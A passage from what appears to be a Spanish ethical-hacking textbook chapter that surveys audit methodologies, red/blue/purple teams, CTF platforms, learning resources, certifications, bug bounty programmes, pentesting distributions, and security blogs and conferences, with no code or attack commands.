  
- **Fase de intervención**. La última fase de la auditoría donde se prueba la penetración en los servicios o un mal funcionamiento en los mismos. Incluye los módulos quarantine verification, privileges audit, survivability validation, alert and log review.

Metodologías del OWASP

El OWASP dispone de tres guías excelentes para la evaluación de la seguridad según el tipo de aplicación:

- **OWASP Web Security Testing Guide (WSTG)**. Este documento, mencionado al comienzo de este apartado, está enfocado en la auditoría de aplicaciones web. El núcleo del documento donde se explican los procedimientos para realizar la auditoría de aplicaciones web se encuentra en la cuarta sección. En ella se incluyen 12 apartados para la búsqueda de vulnerabilidades, entre los que destacan la recolección de información, el testeo de los mecanismos de autenticación y autorización, la gestión de sesiones y objetos (roles, usuarios, cuentas), los mecanismos de validación de los datos de entrada, el manejo de errores, el uso de criptografía débil y la auditoría de una API.
  
- **OWASP Mobile Application Security Testing Guide (MASTG)**. Anteriormente conocido como MSTG (Mobile Security Testing Guide), es un manual para realizar las pruebas de seguridad e ingeniería inversa de aplicaciones para móviles. Describe el proceso técnico que se ha de seguir para verificar los controles que se establecen en el OWASP MASVS (Mobile Application Security Verification Standard), una guía enfocada a desarrolladores para implementar aplicaciones seguras. El documento incluye un apartado general con controles de seguridad independientes de la plataforma, como gestión de sesiones, redes y criptografía, y dos apartados específicos, uno para Android y otro para iOS.
  
- **OWASP Firmware Security Testing Methodology (FSTM)**. El firmware es el responsable del funcionamiento de cualquier dispositivo embebido, como los dispositivos IoT, por lo que su seguridad es clave para evitar cualquier acceso no autorizado. Esta metodología se divide en 9 etapas: recolección de información y reconocimiento, obtención del firmware, análisis del firmware, extracción del sistema de archivos, análisis del contenido del sistema de archivos, emulado del firmware, análisis dinámico, análisis en tiempo de ejecución y explotación binaria. Además, se facilita una máquina virtual basada en Ubuntu, EmbedOS, con las herramientas preparadas para realizar la auditoría.

#### Otras metodologías

Existen otras metodologías que pueden resultar útiles conocer y estudiar. Algunas de ellas son:

- **PCIDSS (Payment Card Industry Data Security Standard)**. Elaborada por el PCI SSC (Security Standards Council), incluye las líneas y requisitos para proteger los datos de sistemas de pago. También elabora otros estándares como el desarrollo de software seguro o sistemas de pago para dispositivos móviles (https://www.pcisecuritystandards.org/document_library/).
  
- **PTF (Penetration Testing Framework)**. Más que un estándar, recopila información de herramientas útiles en cada fase del test de intrusión y presenta posibles escenarios de ataques (http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html).
  
- **NIST SP 800-115 (Technical Guide to Information Security and Assessment)**. Esta guía elaborada por el NIST incluye recomendaciones prácticas para diseñar, implementar y mantener auditorías de seguridad (https://csrc.nist.gov/publications/detail/sp/800-115/final). Además, el NIST está en pleno proceso de publicación de la versión 2.0 del CSF (Cybersecurity Framework), que ha de servir a cualquier organización para garantizar la resiliencia frente a ciberamenazas.
  
- **CAF (The Cyber Assessment Framework)**. Esta guía está diseñada por el NCSC (National Cyber Security Centre) del Reino Unido (https://www.ncsc.gov.uk/collection/caf).

### Equipos de seguridad. Pentesting vs red teaming

Habitualmente se distinguen dos tipos de equipos de seguridad:

- **Red Team (equipo rojo)**. Realiza labores de seguridad ofensiva, por lo que en ellas se incluyen las acciones de un hacker ético.

- **Blue Team (equipo azul)**. Realiza labores de seguridad defensiva como respuesta a incidentes, análisis forense digital, investigación de amenazas (threat hunting), bastionado de sistemas, seguridad operativa (SecOps), etcétera.

A menudo, los términos pentesting y red teaming se confunden o se usan indistintamente, pero hay diferencias importantes entre ellos. Un pentest está orientado a una acción concreta sobre un objetivo y su duración en el tiempo suele ser reducida. En cambio, las labores del Red Team consisten en un ejercicio continuo y constante de prueba de las defensas del objetivo para tratar de superarlas evitando ser descubiertos. Estos ejercicios o simulacros emulan el comportamiento de grupos organizados de ciberdelincuentes, también llamados APT (Advanced Persistent Threat), y cuyo modus operandi se encuentra en la matriz de tácticas, técnicas y procedimientos (TTP) de MITRE Att&ck ([Matriz de tácticas, técnicas y procedimientos MITRE Att&ck](https://attack.mitre.org/)).

Por tanto, el objetivo del Blue Team será que el Red Team no tenga éxito. La forma tradicional de organizar estos equipos era que trabajasen de forma independiente. Más recientemente aparece el **Purple Team**, que realiza una puesta en común del trabajo de ambos equipos para analizar las debilidades, establecer mejoras y organizar los siguientes ejercicios.

Para descubrir qué tipos de ejercicios se llevan a cabo por un Red Team es recomendable visionar la charla **Red Team como herramienta de protección frente APT** ([Red Team como herramienta de protección frente a APT (Layakk). XII Jornadas STIC](https://youtu.be/IJoi-hjS8Ko)) que la empresa Layakk realizó en las XII Jornadas STIC del CCN-CERT. Además, puede consultarse el Apartado 5.1.5 donde se explican algunas de las técnicas que emplean estos equipos.

Además, en la bibliografía reciente se encuentran referencias a otros equipos de seguridad (orange, green, yellow, white, gold, black...). La Figura 1.6, tomada de un artículo del investigador de seguridad Daniel Miessler, relaciona los conceptos más importantes en lo que él llama la **Pirámide BAD** (Build, Attack, Defend). Los equipos orange, green y yellow, inicialmente propuestos por April Wright en la charla **Orange is the new purple** en la conferencia BlackHat 2017, representan la labor de los constructores (builders), como por ejemplo los desarrolladores de software. Resulta recomendable consultar el artículo de Daniel Miessler si se desea profundizar en estos conceptos.

![https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/5af57ea7-5f22-4bc2-a4db-21327f646f83/BAD-pyramid-miessler.png](./img/fig1.6.png)

Figura 1.6. Pirámide BAD (Build, Attack, Defend) donde se representan los diferentes equipos de seguridad. (Fuente: https://danielmiessler.com/study/red-blue-purple-teams/).

## Cómo convertirse en hacker (from zero to hero)

En los apartados anteriores se han expuesto los conceptos relacionados con la seguridad de la información en general, y de la seguridad ofensiva o hacking ético en particular. En las próximas unidades se presentarán los contenidos teóricos y prácticos fundamentales para sentar las bases que harán de nosotros un buen hacker. La lista de todo lo que debería saber un hacker es enorme y es imposible abarcarlo todo en este libro. Este es uno de los motivos por el que hemos querido ofrecer multitud de enlaces a laboratorios prácticos, lecturas recomendadas y bibliografía adicional a lo largo de las diferentes unidades para poder ampliar los conocimientos. Adicionalmente, se incluye este apartado específico para ofrecer consejos y recursos de aprendizaje que ayudarán en el estudio y que complementan los contenidos y actividades de este libro.

Todos esos conocimientos tampoco se pueden obtener en unas pocas semanas o meses, es necesario mucho trabajo, esfuerzo y dedicación, además de experiencia, por lo que es recomendable ser paciente para evitar la frustración. Deje para futuras revisiones los aspectos más técnicos y detallados, organice su aprendizaje en espiral, volviendo a aspectos fundamentales siempre que lo necesite, repita las actividades y laboratorios varias veces una vez haya pasado cierto tiempo, intente no mirar las soluciones la segunda vez que lo haga e interiorice los patrones que se repiten entre distintos laboratorios.

Por otro lado, además de adquirir estos conocimientos centrados estrictamente en aspectos técnicos, es necesario desarrollar un método de trabajo y de aprendizaje que permita desarrollar una actitud crítica y de pensamiento fuera de la caja, que permita mejorar y aprender de manera continua.

### Perfil de un buen hacker o ciberinvestigador

Los conocimientos que debe adquirir un hacker se sustentan sobre una base sólida de conocimientos básicos y avanzados del funcionamiento de los sistemas informáticos. Esto incluye materias o áreas como:

- **Arquitectura de computadoras y lenguaje ensamblador**. Constituye la base del funcionamiento de los elementos hardware y software de los sistemas informáticos.

- **Redes de ordenadores y protocolos de red**. Esto incluye las diferentes arquitecturas de red, los tipos de redes (cableadas, inalámbricas, fibra óptica...), los dispositivos que intervienen en las redes de comunicaciones, la capa de protocolos TCP/IP y OSI y los protocolos de encaminamiento.

- **Administración de sistemas operativos**. Instalar y configurar sistemas operativos, tanto Windows como GNU/Linux, que incluyen elementos como políticas de seguridad, permisos y roles de usuarios y grupos, administración de servicios (DHCP, DNS, FTP, HTTP, SSH...), administración de dominios, gestión de cuotas, configuración de reglas de cortafuegos, etcétera.

- **Gestión y administración de bases de datos**. Conocer los diferentes lenguajes de modelado de datos (SQL y noSQL), diferentes sistemas gestores de bases de datos (relacionales, orientados a objetos), su estructura y comandos de administración.

- **Lenguajes de programación**. Es un área muy amplia que va desde lenguajes de bajo nivel (C, C++, Go, Rust), hasta lenguajes orientados a objetos (Java, C#), programación orientada a aplicaciones móviles (Android, iOS), tecnologías web (JavaScript, Jakarta EE framework, PHP, ASP, NodeJs), lenguajes de scripting (Python, Bash, PowerShell). La lista no es exhaustiva y puede ser que uno de los lenguajes o tecnologías encaje en más de una categoría.

- **Criptografía**. Serán útiles los conocimientos desde dos perspectivas: los fundamentos matemáticos detrás de los algoritmos criptográficos y la aplicación práctica de técnicas criptográficas.

Este libro asume que el lector tiene unos conocimientos mínimos en todas las áreas mencionadas anteriormente. En algunas secciones se repasan algunos de los conceptos fundamentales que son necesarios conocer, pero no siempre esto es posible. Si se carece de esta base necesaria será más difícil avanzar. Por ello, si en algún momento nota que no entiende los conceptos que hay detrás de alguna de las explicaciones que se realizan en este libro, le recomendamos que vuelva a la base del funcionamiento del elemento que se está explicando antes de continuar adelante.

![https://media.licdn.com/dms/image/v2/D4E12AQFQ-ovq7UtVwA/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1662741052323?e=2147483647&v=beta&t=M1m4HO8TWe7brNElZ2VR6fqr29K3MSwQKDGDOH-e988](./img/fig1.7.png)

**Figura 1.7**. Meme que representa a los aprendices de hacker que no tienen una base sólida de conocimientos.
(Fuente: https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/).

### Aprendizaje continuo mediante retos CTF (Capture The Flag)

Como se ha visto al comienzo de la unidad, realizar acciones de hacking ético sin permiso está considerado delito. Para practicar y mejorar nuestras habilidades disponemos de multitud de entornos de pruebas que simulan escenarios reales y que han sido diseñados para ser explotados.

Los retos de captura la bandera o Capture The Flag (CTF) consisten en la obtención de un código oculto (flag) en el reto, que solo es accesible para aquellos que descubren la vulnerabilidad o el punto débil del reto. En este tipo de retos prima el resultado sobre el proceso, por lo que no hay que dar explicaciones de cómo se ha logrado resolver. Basta con obtener la bandera para demostrar que se tienen las habilidades que llevan a su resolución. Para evitar que se puedan hacer trampas existen códigos de conducta que se deben respetar. El más importante es no hacer pública la solución a un reto, denominado *writeup* o *walkthrough*, hasta que el reto deje de estar activo.

Los tipos de CTF se pueden clasificar en tres grandes categorías:

- **Retos (challenges)**. Los challenges son retos que sirven como modelo para un tipo de habilidad técnica o vulnerabilidad concreta. Son los más habituales en los concursos o campeonatos que se organizan cada año por diversas empresas, organizaciones, universidades, etc. El tipo de CTF más habitual se conoce como Jeopardy; consta de una serie de retos de distintas categorías que otorgan una puntuación tras su resolución en función del nivel de dificultad de cada ejercicio. Estos campeonatos se disputan de forma individual o por equipos y tienen una duración de tiempo determinada. Al finalizar el campeonato gana el individuo o equipo que más puntos ha acumulado. Las categorías que suelen aparecer en estos retos son criptografía (Crypto), esteganografía (Stego), web, análisis forense (Forensics), ingeniería inversa (Reversing), explotación binaria (Pwn), hardware y miscelánea (Misc).
- **Máquinas (boxes)**. Este tipo de CTF consiste en explotar una máquina a través de algún servicio vulnerable o mal configurado con una aproximación de caja negra, es decir, no se sabe nada acerca del objetivo, por lo que realizar una buena enumeración es fundamental. La explotación se lleva a cabo en dos fases: la obtención de la bandera de usuario y la escalada de privilegios para obtener la bandera de administrador. Cada una de estas banderas da una serie de puntos cuyo valor depende de la dificultad de la máquina (fácil, medio, difícil, muy difícil). En esta categoría se podrían incluir las competiciones de ataque y defensa (attack & defense, también llamadas *king of the hill*), donde, en equipo o de forma individual, se debe a la vez proteger la máquina propia y atacar la del contrario. Inicialmente, se desconoce completamente la máquina en la que estamos situados, pero todos disponen de la misma máquina, por lo que se trata de una carrera para descubrir las vulnerabilidades, bastionar nuestra máquina y atacar la del contrario antes de ser atacados.
- **Redes (networks o labs)**. Consiste en un entorno que simula una red empresarial donde hay que explotar diferentes máquinas y realizar pivotaje en la red hasta lograr alcanzar el objetivo final. También existen escenarios de diferente dificultad y el número de banderas que hay que obtener puede ser bastante elevado.

Existen numerosas plataformas en Internet donde se puede practicar todo este tipo de retos. Comenzaremos mencionando aquellas plataformas orientadas a retos o challenges.

- [**Atenea**](https://atenea.ccn-cert.cni.es/). Plataforma creada por el CCN-CERT que tiene numerosos retos en distintas categorías. Además, se pueden consultar todos los retos de años pasados. Tiene una sección «Academia» donde se explican conceptos teóricos y prácticos de las distintas disciplinas.

- [**Academia Hacker**](https://www.incibe.es/ed2026/talento-hacker/academia-hacker). Creada recientemente por el INCIBE, dispone de una sección de retos descargables organizados en diferentes niveles de dificultad. Además, ofrece el solucionario (*writeup*) de todos ellos. La academia ofrece la posibilidad de inscribirse en talleres temáticos que se convocan a lo largo del año y también organiza una competición CTF para descubrir talento y seleccionar al equipo nacional que forma parte de las competiciones de hacking que se organizan a nivel europeo y mundial.
- [**Una al mes**](https://unaalmes.hispasec.com/home). Creada por la empresa Hispasec, publica un reto cada mes, emulando su boletín de noticias «Una al día».
- [**PicoCTF**](https://picoctf.org/). Es una plataforma de retos creada por la Universidad Carnegie Mellon. Realiza una competición anual orientada a estudiantes de secundaria y educación superior, con retos realmente exigentes. En su web también ofrece una sección con recursos de aprendizaje. En la plataforma de retos se encuentran accesibles todos los retos de las competiciones realizadas desde 2019, por lo que es un buen lugar para entrenar y poner en práctica nuestras habilidades.

- [**CTF Time**](https://ctftime.org/). Es la web de referencia para buscar eventos CTF que se van a realizar en el futuro o que ya se han realizado. Incluye clasificaciones de equipos y enlaces a las soluciones de los retos ya realizados en los CTF.

Por otro lado, existen plataformas orientadas principalmente a la resolución de máquinas, pero pueden incluir otros tipos de retos. Las más relevantes son:

- [**HackTheBox**](https://www.hackthebox.com/). Esta empresa fundada en 2017 por James Hooker (@gOblin), Haris Pylarinos (@ch4p) y Aris Zikopoulos (@azik), tiene más de dos millones de usuarios y es el referente de este tipo de plataformas, ya que la dificultad y grado de profesionalidad de sus máquinas es un aspecto que destacar. Dispone de un conjunto de unas 20 máquinas activas de dificultades easy, medium, hard e insane, cuya resolución otorga puntos al usuario que, en función del número y nivel de máquinas vulneradas, adquiere un ranking (rank). Cualquier usuario registrado puede enfrentarse a estas máquinas que, tras un cierto tiempo, se retiran por otras nuevas. Recientemente se ha creado una nueva competición llamada Seasonal, en la que cada máquina nueva suma puntos solo la primera semana en la que se encuentra activa. Para las máquinas retiradas de la competición se permite publicar sus soluciones, pero para poder conectarse a ellas se requiere una cuenta de pago. En HackTheBox hay otros tipos de retos, como Challenges y varios tipos de redes (Fortress, Endgames y Pro Labs), y organizan competiciones CTF de manera frecuente (https://ctf.hackthebox.com/), la más importante de ellas es el Cyber Apocalypse. En 2020 crearon HTB Academy (https://academy.hackthebox.com), un lugar donde aprender desde cero todos los conocimientos relacionados con el hacking. En esta plataforma existen diferentes módulos de aprendizaje clasificados por niveles, llamados tier, desde el 0 hasta el IV. Para acceder a un módulo se necesitan cubes, y al finalizarlo se obtienen como recompensa un número de cubes también. Todos los módulos del tier 0 se consideran gratuitos ya que el costo en cubes es idéntico a la recompensa que se obtiene al terminarlo. Para el resto de los módulos es necesario pagar para obtener cubes. Otra novedad de esta plataforma es que han creado varias certificaciones de ciberseguridad propias siguiendo el currículum creado en HTB Academy: HTB Certified Penetration Testing Specialist (CPTS) y HTB Certified Bug Bounty Hunter (CBBH).

- [**TryHackMe**](https://tryhackme.com/). Esta plataforma ofrece laboratorios de aprendizaje, llamados rooms, con una serie de tareas guiadas que explican el proceso paso a paso para aprender nuevos conceptos, manejar una herramienta, explotar un servicio o una máquina completa, etc., por lo que es un lugar excelente para aprender y practicar. Además, existen otros laboratorios de tipo CTF que consisten en máquinas vulnerables donde no se ofrece ninguna pista para obtener las banderas, donde es posible poner a prueba nuestro nivel. También dispone de redes de máquinas (networks). Existen laboratorios de acceso gratuito y otros solo accesibles mediante suscripción. A diferencia de las plataformas competitivas, como HTB, en THM se permite publicar la solución de cualquier room existiendo un enlace en el propio laboratorio para consultarla.

- [**VulnHub**](https://www.vulnhub.com/). Es un repositorio de máquinas virtuales vulnerables creadas por la comunidad y de acceso libre. Hay más de 700 laboratorios para descargar, normalmente en formato OVA (VirtualBox). Actualmente, el proyecto está promocionado por la empresa Offensive Security.

- [**HackMyVM**](https://hackmyvm.eu/). Otro repositorio de máquinas virtuales vulnerables libres que se ha creado recientemente. Existe la opción de descargar las imágenes de forma anónima o registrarse en la plataforma para enviar las banderas obtenidas y registrar nuestro progreso. Hay más de 200 máquinas con tres niveles de dificultad: fácil, media y difícil.

- [**Proving Grounds**](https://www.offensive-security.com/labs/individual/). Plataforma creada por la empresa Offensive Security con dos versiones, Play (gratuita) y Practice (de pago). PG Play es una plataforma online que incluye las máquinas de la plataforma VulnHub con tres horas diarias de acceso, mientras que PG Practice no tiene limitación de tiempo, incluye máquinas con SO Windows y máquinas especiales creadas por los expertos de la empresa.

Existen otras muchas plataformas y recursos para practicar retos y máquinas vulnerables que se irán descubriendo poco a poco a lo largo del libro.1.5.3.

### Recursos de aprendizaje

En Internet existen varias guías interesantes donde se ofrecen recursos de aprendizaje, algunos gratuitos y otros de pago, para lograr obtener la certificación de ciberseguridad OSCP (Offensive Security Certified Professional), una de las más valoradas y perseguidas. Más allá de que se desee obtener una certificación o no, hay que considerar la consulta de estas guías, ya que ofrecen recursos y recomendaciones interesantes que pueden complementarse con cada una de las unidades de este libro.

La guía más famosa es la elaborada por TJNull (@TJ_Null), *The Journey to Try Harder* ([TJnull’s Preparation Guide for PEN-200 PWK/OSCP 2.0](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html)), publicada en su blog NetSec Focus, que incluye 20 secciones con información general, aprendizaje de la línea de comandos, manejo de la distribución Kali Linux, aprendizaje de las diferentes fases del hacking y otras secciones adicionales, la más conocida de las cuales es la lista de máquinas vulnerables de diversas plataformas (Proving Grounds, HackTheBox y VulnHub) que recomienda explotar para conocer y estudiar las técnicas de hacking más relevantes.

Una guía no demasiado extensa pero con recursos interesantes es la del investigador John Jackson, con consejos para principiantes y enlaces a recursos específicos de hacking, que principalmente dirigen a la plataforma TryHackMe y a los cursos de TCM Academy ([OSCP Reborn - 2023 Exam Preparation Guide](https://johnjhacking.com/blog/oscp-reborn-2023/)).

The Cyber Mentor (TCM) es un hacker reconocido por sus completos cursos de introducción a las redes y al hacking (*Beginners Network Penetration Testing* y *Practical Ethical Hacking*) que publicó en su canal de YouTube y en Udemy hace varios años ya. Recientemente fundó la empresa TCM Academy, una plataforma de aprendizaje con cursos a un precio bastante asequible y una certificación propia, PNPT (*Practical Network Penetration Tester*). Además, sigue publicando parte del contenido de sus cursos en su canal de YouTube, [Ethical Hacking in 15 hours 2023 Edition](https://www.youtube.com/watch?v=3FNYvj2U0HM). Cada año publica en su blog una guía con recursos para el aprendizaje del hacking ético ([How to become an Ethical Hacker in 2023](https://tcm-sec.com/so-you-want-to-be-a-hacker-2023-edition/)).

En el mundo hispanohablante destaca Marcelo Vázquez, alias s4vitar, quien cada día en Twitch realiza directos explicando técnicas de hacking o explotando alguna máquina. En abril de 2023 lanzó el curso *Introducción al hacking ético* ([Curso de introducción al hacking. Academia Hack4u](https://hack4u.io/cursos/introduccion-al-hacking/)) en su academia online Hack4u con más de 50 horas de contenido.

También en el mundo hispano existe la iniciativa Clb3rwall ([Proyecto Clb3rWall](https://clb3rwall.policia.es/)), un proyecto de la Policía Nacional que ofrece formación gratuita online con la participación de grandes expertos y profesionales. Además, cada año organizan el Congreso Clb3rwall, que se realiza en la sede de la Escuela de la Policía Nacional en Ávila a finales de junio.

Un recurso fundamental que debe estar en todos los marcadores es la web [HackTricks](https://www.hacktricks.xyz/), sitio de referencia de pentesters, jugadores de CTF y expertos en ciberseguridad. Este libro online gratuito recopila técnicas de explotación, detección de vulnerabilidades, escalada de privilegios, fallos de configuración, bastionado de servicios y un largo etcétera. Recientemente se ha publicado el libro *HackTricks Cloud*, orientado a técnicas de pentesting en servicios en la nube. Detrás de este sitio web está Carlos Polop (@carlospolopm), desarrollador de software y experto en seguridad, mentor del equipo nacional del INCIBE que participa en el ECTS (European Cyber Security Challenge). También es desarrollador de las herramientas PEASS-NG (*Privilege Escalation Awesome Script Suite New Generation*), que se estudiarán en la Unidad 6. Carlos también dispone de canales en YouTube y Twitch donde realiza emisiones en directo y cuelga videos relacionados con el hacking ético.

Por último, destacan varios streamers que crean contenido muy interesante y que pueden seguirse para un aprendizaje continuo:

- **Ippsec** ([Ippsec YouTube](https://youtube.com/c/ippsec)). Lideró durante meses la clasificación de HackTheBox y comenzó a publicar la resolución de las máquinas en su canal de YouTube una vez que eran retiradas. Actualmente sigue haciendo esta labor como trabajador de la plataforma, además de diseñar y revisar nuevos retos.

- **John Hammond** ([John Hammond YouTube](https://www.youtube.com/c/JohnHammond010)). En su canal se publican videos de temáticas muy distintas: resolución de retos de distintos CTF como PicoCTF, máquinas de TryHackMe, análisis de malware, configuración y uso de herramientas, entrevistas, técnicas de hacking, etc. Además, diseña retos para algunos CTF prestigiosos.

- **LiveOverflow** ([LiveOverflow YouTube](https://www.youtube.com/c/LiveOverflow)). Este investigador alemán publica contenido con una gran base pedagógica, explicando conceptos tanto sencillos como complejos. Además, ha creado una academia online llamada Hextree ([Hextree](https://www.hextree.io)) donde se incluye contenido gratuito y de pago.

- **HackerSploit** ([HackerSploit YouTube](https://youtube.com/c/HackerSploit)). El canal de Alexis Ahmed está repleto de series de videos de todo tipo, desde cuestiones básicas de manejo de Linux, hasta cuestiones avanzadas de técnicas de Red Team.

#### Certificaciones de ciberseguridad

El mundo de las certificaciones se mueve en una delgada línea entre un negocio lucrativo y la utilidad práctica. En la web de Paul Jeremy se encuentra un roadmap donde se muestran las certificaciones sobre seguridad informática existentes (473 en enero de 2023), clasificadas por niveles de dificultad, de principiante (abajo) a experto (arriba), y por categorías (de izquierda a derecha) en bloques de colores. Las certificaciones orientadas a seguridad ofensiva se encuentran en el borde derecho de la imagen englobadas en dos tipos: penetration testing y exploitation. La web dispone de elementos interactivos cuando se sitúa el ratón encima de alguna certificación, donde se puede ver por ejemplo el precio de cada una de ellas ([Clasificación de certificaciones de seguridad por nivel de dificultad y categorías](https://pauljerimy.com/security-certification-roadmap/)).

Algunas de las certificaciones más relevantes en el ámbito de la seguridad ofensiva son:

- **CEH (EC Council Certified Ethical Hacker)**. Es una de las certificaciones más extendidas y demandadas, pero suele ser muy criticada por su bajo contenido práctico, aunque esto ha cambiado a partir de la versión 12 (CEHv12).

- **Pentest+**. Certificado de CompTIA (The Computing Technology Industry Association) con un nivel intermedio. A diferencia de otras certificaciones, esta incluye elementos de todas las fases de un test de intrusión.

- **eJPT (eLearnSecurity Junior Penetration Tester)**. Esta certificación de eLearnSecurity está enfocada a expertos de IT que comienzan en el área del pentesting; por tanto, es una certificación de nivel básico.

- **eCPPT (eLearnSecurity Certified Professional Penetration Tester)**. Certificación de eLearnSecurity de nivel avanzado sobre test de intrusión.

- **HTB CPTS (HackTheBox Certified Penetration Testing Specialist)**. Mencionada anteriormente, es una certificación creada por la plataforma HackTheBox.

- **PNPT (TCM Security Practical Network Penetration Tester)**. También mencionada en un apartado anterior; es la certificación creada por la empresa TCM Security.

- **OSCP (Offensive Security Certified Professional)**. Esta certificación de Offensive Security posiblemente sea la más temida y codiciada en el sector por su nivel de dificultad; también es una de las que más inversión económica precisa para realizarla. Su lema, «Try Harder», anima a aquellos que no han conseguido su objetivo a seguir intentándolo y nunca tirar la toalla.

No es labor de esta obra decantarse por ninguna de ellas. Si se desea más información, pueden consultarse las páginas de referencia de cada certificación para saber los requisitos, el tipo de examen, el precio y demás detalles. Si está empezando en el hacking ético, como imaginamos, nuestro consejo es que no se obsesione con esto, el aprendizaje es largo y lleva su tiempo adquirir los conocimientos suficientes. Tómese su tiempo para ganar experiencia.

### Plataformas de recompensas (bug bounty)

Un programa de recompensas (bug bounty) es un mecanismo por el que grandes empresas, fabricantes, etc., pagan una cantidad económica a un hacker por reportar vulnerabilidades en sus sistemas o en su software. Es una forma de incentivar la búsqueda y descubrimiento de vulnerabilidades de manera ética para que sean reportadas antes de que caigan en malas manos.

El programa de recompensas puede estar abierto para que participe cualquier persona o puede ser privado, de modo que la empresa elige a las personas que pueden participar en él. Normalmente, las empresas que comienzan un programa de recompensas lo hacen de forma privada, y con el paso del tiempo y conforme van adquiriendo experiencia y confianza, lo hacen público.

Los sitios web de las empresas suelen tener un lugar para informar sobre sus programas de recompensas. El RFC 9116, aceptado en 2022 por el IETF, establece el archivo security.txt como la forma recomendada para informar a los investigadores de seguridad sobre cómo reportar los fallos de seguridad que encuentren. Este archivo se puede situar en la raíz del dominio o en la carpeta /.well-known/. La Figura 1.8 muestra el contenido del archivo security.txt de Google. Si no existe el archivo, no significa que esa empresa no disponga de un programa de recompensas, ya que no es algo obligatorio.

![image-20241016132222182](./img/fig1.8.png)

Figura 1.8. Contenido del fichero security.txt de Google. (https://www.google.es/.well-known/security.txt)

Las empresas suelen gestionar sus programas de recompensas a través de las plataformas intermediarias que existen. Las más conocidas son:

- **Bugcrowd** (https://www.bugcrowd.com/bug-bounty-list/). Una de las plataformas principales a nivel global donde están los programas de recompensas de las mayores empresas.

- **HackerOne** (https://hackerone.com/bug-bounty-programs). Similar a la anterior, es una de las plataformas de recompensas más importantes con una lista de programas públicos muy extensa.

- **Intigriti** (https://www.intigriti.com). Plataforma de recompensas de ámbito europeo cuya sede se encuentra en Bélgica. Financiada con fondos de la Unión Europea, también dispone de programas para evaluar la seguridad de las herramientas de la Comisión y otros organismos europeos.

- **Immunefi** (https://immunefi.com/). Esta plataforma de recompensas está enfocada a la protección de activos digitales y proyectos DeFi (Decentralized Finance) como monederos de criptomonedas o smart contracts, conocida como Web3. Las cuantías que se pagan como recompensa son elevadas ya que un fallo de seguridad en esos sistemas puede llevar a la pérdida de grandes sumas de dinero.

### Distribuciones para pentesting

Para llevar a cabo las labores de pentesting se necesita un buen arsenal de herramientas, que se pueden instalar manualmente en el sistema operativo cuando se vayan necesitando o se puede emplear alguna de las distribuciones específicamente creadas para esta tarea. La segunda opción es la más recomendable y la más empleada ya que facilita enormemente el trabajo y ahorra una gran cantidad de tiempo. Entre las distribuciones disponibles destacan las siguientes:

- **Kali Linux** (https://www.kali.org/). Distribución de seguridad basada en Debian desarrollada por la empresa Offensive Security. Dispone de numerosas opciones de instalación: en dispositivos ARM, cloud, máquinas virtuales, WSL, contenedores, dispositivos móviles (Kali NetHunter) y dispositivos USB. También dispone de un enorme repositorio de paquetes donde se incluyen nuevas herramientas con cada nueva versión, lo que facilita la instalación automatizada de estas.

- **ParrotOS** (https://parrotsec.org/). Distribución de seguridad basada en Debian. En 2022 comenzó una alianza con HackTheBox para mejorar su desarrollo e incluirla en la plataforma a través de la web.

- **BlackArch** (https://blackarch.org/). Distribución de seguridad basada en Arch Linux con más de 2800 herramientas en sus repositorios.

- **CommandoVM** (https://github.com/mandiant/commando-vm). Es un conjunto de herramientas para convertir el sistema operativo Windows en una distribución de seguridad ofensiva. Creada por la empresa Mandiant.

Las explicaciones de las herramientas y los laboratorios de este libro se han realizado utilizando la distribución Kali Linux.

### Mantenerse bien informado

El mundo de la tecnología avanza a pasos agigantados, por lo que en un corto periodo de tiempo se suceden numerosas novedades. Lo mismo sucede en ciberseguridad; por tanto, es preciso mantenerse al día de todo lo que ocurre. Una forma de hacerlo es a través de blogs especializados, de los que se recomiendan los siguientes:

- **Una al día** (https://unaaldia.hispasec.com/). La iniciativa de Hispasec nació hace más de 24 años y desde entonces no faltan a su cita diaria con una publicación relacionada con la seguridad informática.

- **Un informático en el lado del mal** (https://www.elladodelmal.com/). El blog personal de Chema Alonso, que ha cumplido 17 años en enero de 2023, es un referente en el mundo de la ciberseguridad.

- **Flu Project** (https://www.flu-project.com/). Sitio web de Pablo González y Juan Antonio Calles donde encontrar noticias y artículos de investigaciones. Además, en él publican otros autores del panorama nacional.

- **Hackplayers** (https://www.hackplayers.com/). Otro sitio web de referencia en castellano donde las publicaciones son frecuentes y hay un gran número de colaboradores.

- **The Hacker Way** (https://thehackerway.com/). Sitio web de Daniel Echeverri, alias Adastra, con numerosas publicaciones de gran calidad técnica.

- **Hacking Articles** (https://www.hackingarticles.in/). Sitio con publicaciones continuas de diferentes categorías, soluciones a retos CTF, utilización de herramientas, técnicas de hacking, red teaming, etc.

- **Google Project Zero** (https://googleprojectzero.blogspot.com/). El blog del equipo de Google encargado de descubrimientos de vulnerabilidades zero day. Sus publicaciones suelen ser explicaciones técnicas de sus descubrimientos.

- **ArsTechnica** (https://arstechnica.com/information-technology/). La sección de tecnología es un lugar de referencia para mantenerse al día de las últimas novedades.

Las conferencias de seguridad que se organizan cada año son un punto de encuentro de hackers e investigadores que comparten sus nuevos descubrimientos, realizan talleres y demostraciones prácticas, sirven para formarse y mantenerse actualizados. Como no siempre es posible asistir a las charlas, algunas de ellas se publican libremente para consulta de todo el mundo y, en determinados casos, se emiten en directo en plataformas de streaming. Destacan las siguientes conferencias, dos de carácter internacional y el resto en España o Latinoamérica:

- **Blackhat** (https://www.blackhat.com). Una de las conferencias de referencia a nivel mundial donde se reúnen los mejores hackers del globo. Se realizan varios eventos anuales (BlackHat Asia, BlackHat USA, BlackHat Europe, etc.).
- **DEFCON** (https://defcon.org). Esta conferencia que se realiza en Las Vegas cada año es uno de los principales eventos de hacking del planeta.
- **RootedCON** (https://www.rootedcon.com/). Posiblemente la conferencia de seguridad más importante del país que se celebra desde 2010.
- **Navaja Negra** (https://www.navajanegra.com). Otra conferencia referente en España. Se celebra desde 2012 en Albacete y la organiza la Escuela Superior de Ingeniería Informática y la UCLM.
- **DragonJar** (https://www.dragonjarcon.org/). Esta conferencia de seguridad se organiza en Colombia y ofrece acceso online y gratuito.
- **H-CON** (https://www.h-c0n.com/p/home.html). Conferencia de ciberseguridad organizada por la comunidad de Hackplayers.
